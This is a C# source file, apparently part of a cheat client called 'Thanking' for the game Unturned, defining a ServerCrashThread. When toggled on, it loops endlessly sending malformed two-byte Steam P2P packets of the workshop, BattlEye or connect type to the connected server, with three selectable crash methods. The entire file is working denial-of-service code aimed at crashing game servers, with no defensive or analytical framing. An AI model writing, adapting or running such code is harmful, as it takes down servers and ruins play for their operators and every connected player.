﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Xml.Schema;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Options;
using Thanking.Overrides;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class ServerCrashThread
    {
        public static bool ServerCrashEnabled;
        public static bool AlwaysCrash;
        
        [Thread]
        public static void Start()
        {
            Provider.onClientDisconnected += () =>
            {
                ServerCrashEnabled = false;
                OV_Provider.IsConnected = false;
            };

            byte[] P1 = { (byte) ESteamPacket.WORKSHOP, 0 };
            byte[] P2 = { (byte) ESteamPacket.BATTLEYE, 0 };
            byte[] P3 = { (byte) ESteamPacket.CONNECT, 0 };
            
            while (true)
            {
                if (OV_Provider.IsConnected && (ServerCrashEnabled || AlwaysCrash))
                {
                    switch (MiscOptions.SCrashMethod)
                    {
                        case 1:
                            while (OV_Provider.IsConnected && (ServerCrashEnabled || AlwaysCrash))
                                SteamNetworking.SendP2PPacket(Provider.server, P1, 2, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
                            
                            break;
                        
                        case 2:
                            while (OV_Provider.IsConnected && (ServerCrashEnabled || AlwaysCrash))
                                SteamNetworking.SendP2PPacket(Provider.server, P2, 2, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
                            
                            break;
                        
                        case 3:
                            while (OV_Provider.IsConnected && (ServerCrashEnabled || AlwaysCrash))
                                SteamNetworking.SendP2PPacket(Provider.server, P3, 2, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
                            
                            break;
                    }
                }
                else
                    Thread.Sleep(1000);
            }
        }
    }
}
